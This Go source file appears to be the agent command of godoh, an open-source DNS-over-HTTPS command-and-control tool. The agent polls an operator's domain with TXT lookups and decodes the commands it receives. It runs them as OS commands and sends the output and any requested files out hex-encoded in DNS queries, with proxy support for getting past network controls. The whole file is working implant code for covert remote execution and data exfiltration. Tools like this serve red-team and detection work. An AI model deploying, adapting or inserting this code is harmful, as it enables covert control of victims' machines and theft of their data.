package cmd

import (
	"context"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/miekg/dns"
	"github.com/rs/zerolog/log"
	"github.com/sensepost/godoh/lib"
	"github.com/sensepost/godoh/protocol"
	"github.com/spf13/cobra"
)

var agentCmdAgentName string
var agentCmdAgentPoll int

// Proxy settings
var proxyAddr string
var proxyUsername string
var proxyPassword string

// agentCmd represents the agent command
var agentCmd = &cobra.Command{
	Use:   "agent",
	Short: "Connect as an Agent to the DoH C2",
	Long: `Connect as an Agent to the DoH C2.

Example:
	godoh --domain example.com agent
	godoh --domain example.com agent -n agent1
	godoh --domain example.com agent --agent-name agent1 --poll-time 5`,
	Run: func(cmd *cobra.Command, args []string) {

		log := options.Logger

		if agentCmdAgentName == "" {
			agentCmdAgentName = lib.RandomString(5)
		}

		log.Debug().Msg("resolving dns client")
		client, err := options.GetDNSClient()
		if err != nil {
			log.Fatal().Err(err).Msg("failed to get dns client")
		}

		log.Debug().Msg("polling started")

		for {
			// Wait for the next poll!
			time.Sleep(time.Second * time.Duration(agentCmdAgentPoll))

			pollDomain := fmt.Sprintf("%x.%s", agentCmdAgentName, options.Domain)
			log.Debug().Str("poll-domain", pollDomain).Msg("poll domain")

			// Do lookup
			response := client.Lookup(pollDomain, dns.TypeTXT)

			// Do nothing.
			if strings.Contains(response.Data, protocol.NoCmdTxtResponse) {
				continue
			}

			if strings.Contains(response.Data, protocol.ErrorTxtResponse) {
				log.Error().Msg("server indicated an error. stopping :(")
				continue
			}

			if strings.Contains(response.Data, protocol.CmdTxtResponse) {

				cmdParsed := strings.Split(response.Data, "p=")[1]
				cmd := strings.Split(cmdParsed, "\"")[0]
				log.Debug().Str("cmd-data", cmd).Msg("raw command")

				// decode the command
				dataBytes, err := hex.DecodeString(cmd)
				if err != nil {
					log.Error().Err(err).Msg("failed to decode command data")
					return
				}

				var command string
				lib.UngobUnpress(&command, dataBytes)
				log.Debug().Str("cmd", command).Msg("executing command")

				// Execute the command!
				commandSplit := strings.Split(command, " ")
				cmdBin := commandSplit[0]
				cmdArgs := commandSplit[1:]

				// TODO: Check if the command is a `cd` command.
				// If so, set something like cmd.Cwd

				// File download
				if cmdBin == "download" {
					log.Debug().Str("cmd", command).Msg("command is to download a file")
					if err := downloadFile(strings.Join(cmdArgs, " ")); err != nil {
						log.Error().Err(err).Msg("failed to download file")
					}
					continue
				}

				// Exec an os command
				log.Debug().Str("cmd", command).Msg("command is an os command")
				go executeCommand(cmdBin, cmdArgs)
				continue
			}
		}
	},
}

func init() {
	// setup proxy
	cobra.OnInitialize(configureProxy)

	rootCmd.AddCommand(agentCmd)
	agentCmd.Flags().StringVarP(&agentCmdAgentName, "agent-name", "n", "", "Agent name to use. (default: random)")
	agentCmd.Flags().IntVarP(&agentCmdAgentPoll, "poll-time", "t", 10, "Time in seconds between polls.")
	agentCmd.Flags().StringVarP(&proxyAddr, "proxy", "X", "", "Use proxy, i.e hostname:port")
	agentCmd.Flags().StringVarP(&proxyUsername, "proxy-username", "U", "", "proxy username to use")
	agentCmd.Flags().StringVarP(&proxyPassword, "proxy-password", "P", "", "proxy password to use")
}

// executeCommand executes an OS command
func executeCommand(cmdBin string, cmdArgs []string) {
	log := options.Logger

	out, err := exec.Command(cmdBin, cmdArgs...).CombinedOutput()
	if err != nil {
		out = []byte(err.Error())
	}

	// Send the response back to the server!
	commandOutput := protocol.Command{}
	commandOutput.Data = out
	commandOutput.ExecTime = time.Now().UTC().UnixNano()

	commandOutput.Prepare(cmdBin + strings.Join(cmdArgs, " "))
	requests, successFlag := commandOutput.GetRequests()

	log.Debug().Int("requests", len(requests)).Msg("result request count")

	client, err := options.GetDNSClient()
	if err != nil {
		log.Fatal().Err(err).Msg("failed to get dns client")
	}

	for _, r := range requests {
		response := client.Lookup(fmt.Sprintf("%s.%s", r, options.Domain), dns.TypeA)

		if response.Data == successFlag {
			log.Debug().Str("response", response.Data).Str("labels", r).Msg("request success")
		} else {
			log.Debug().Str("response", response.Data).Str("labels", r).Msg("request failed. exiting")
			return
		}
	}
}

// downloadFile downloads a file from the agent
func downloadFile(fileName string) error {
	log := options.Logger

	file, err := os.Open(fileName)
	if err != nil {
		return err
	}
	defer file.Close()

	fileInfo, err := file.Stat()
	if err != nil {
		return err
	}

	fileBuffer, err := ioutil.ReadAll(file)
	if err != nil {
		return err
	}

	message := protocol.File{}
	message.Prepare(&fileBuffer, fileInfo)
	requests, successFlag := message.GetRequests()

	client, err := options.GetDNSClient()
	if err != nil {
		log.Fatal().Err(err).Msg("failed to get dns client")
	}

	for _, r := range requests {
		response := client.Lookup(fmt.Sprintf("%s.%s", r, options.Domain), dns.TypeA)

		if response.Data == successFlag {
			log.Debug().Str("response", response.Data).Str("labels", r).Msg("request success")
		} else {
			log.Debug().Str("response", response.Data).Str("labels", r).Msg("request failed. exiting")
			return nil
		}
	}

	return nil
}

func configureProxy() {
	if proxyAddr != "" {

		if proxyUsername == "" || proxyPassword == "" {
			log.Error().Msg("proxy username or password were not provided")
			os.Exit(1)
		}

		dialContext := (&net.Dialer{
			KeepAlive: 30 * time.Second,
			Timeout:   30 * time.Second,
		}).DialContext

		basicDialContext := func(ctx context.Context, network, address string) (net.Conn, error) {
			conn, err := dialContext(ctx, network, proxyAddr)
			if err != nil {
				return conn, err
			}
			log.Debug().Str("hostname", proxyAddr).Msg("using proxy")
			log.Debug().Msg("attempting to inject Basic authentication")
			err = lib.ProxySetup(conn, address, proxyUsername, proxyPassword, options.UserAgent)
			if err != nil {
				log.Error().Msg("failed to inject Basic authentication")
				return conn, err
			}
			return conn, err
		}

		http.DefaultTransport.(*http.Transport).Proxy = nil
		http.DefaultTransport.(*http.Transport).DialContext = basicDialContext

	} else {
		log.Debug().Msg("proxy address not set")
	}
}
